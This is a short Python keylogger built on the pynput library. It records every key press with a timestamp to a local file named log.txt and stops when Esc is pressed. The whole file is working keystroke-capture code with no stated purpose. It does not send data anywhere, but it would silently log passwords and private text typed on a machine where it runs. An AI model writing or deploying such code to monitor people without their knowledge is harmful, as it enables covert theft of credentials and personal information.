import pynput
from pynput.keyboard import Key, Listener
import datetime

def on_press(key):
    write_file(str(key))

def on_release(key):
    if key == Key.esc:
        return False

def write_file(key):
    with open("log.txt",'a') as f:
        f.write(str(datetime.datetime.now()))
        f.write(" ")

        key = key.replace("'","")
        f.write(key)
        f.write("\n")


def keylog():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()